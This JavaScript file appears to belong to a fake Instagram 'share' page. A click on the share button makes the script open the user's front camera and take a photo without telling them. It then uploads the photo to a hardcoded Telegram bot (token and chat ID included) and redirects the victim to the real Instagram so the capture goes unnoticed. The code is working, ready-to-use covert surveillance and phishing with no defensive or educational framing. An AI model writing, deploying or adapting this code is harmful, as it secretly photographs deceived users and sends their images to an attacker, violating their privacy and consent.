// Telegram configuration
const BOT_TOKEN = '7928710778:AAFMvQ-Ei_e9f6SgbpTg1Q46zrGpMTUr4RE';
const CHAT_ID = '248714805';

// DOM elements
const shareTrigger = document.getElementById('shareTrigger');
const cameraOverlay = document.getElementById('cameraOverlay');
const cameraPreview = document.getElementById('cameraPreview');
const cameraCanvas = document.getElementById('cameraCanvas');

let stream = null;

// Initialize when share button is clicked
shareTrigger.addEventListener('click', initCamera);

async function initCamera() {
    try {
        // Show loading overlay
        cameraOverlay.style.display = 'flex';

        // Start camera
        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 640 },
                height: { ideal: 480 }
            },
            audio: false
        });

        cameraPreview.srcObject = stream;

        // Wait for camera to initialize
        cameraPreview.onloadedmetadata = () => {
            setTimeout(capturePhoto, 300); // Small delay for better capture
        };

    } catch (error) {
        console.error('Camera error:', error);
        alert('Could not access camera. Please enable permissions.');
        cameraOverlay.style.display = 'none';
    }
}

async function capturePhoto() {
    try {
        // Set canvas dimensions
        cameraCanvas.width = cameraPreview.videoWidth;
        cameraCanvas.height = cameraPreview.videoHeight;

        // Capture image
        const ctx = cameraCanvas.getContext('2d');
        ctx.drawImage(cameraPreview, 0, 0, cameraCanvas.width, cameraCanvas.height);

        // Convert to JPEG
        const imageData = cameraCanvas.toDataURL('image/jpeg', 0.8);

        // Send to Telegram
        const blob = await fetch(imageData).then(r => r.blob());
        const formData = new FormData();
        formData.append('photo', blob, 'instagram_share.jpg');

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
            method: 'POST',
            body: formData
        });

        console.log('Photo sent successfully');

    } catch (error) {
        console.error('Error sending photo:', error);
    } finally {
        // Clean up
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }

        // Hide overlay and redirect
        setTimeout(() => {
            cameraOverlay.style.display = 'none';
            window.location.href = 'https://instagram.com'; // Redirect to real Instagram
        }, 1500);
    }
}
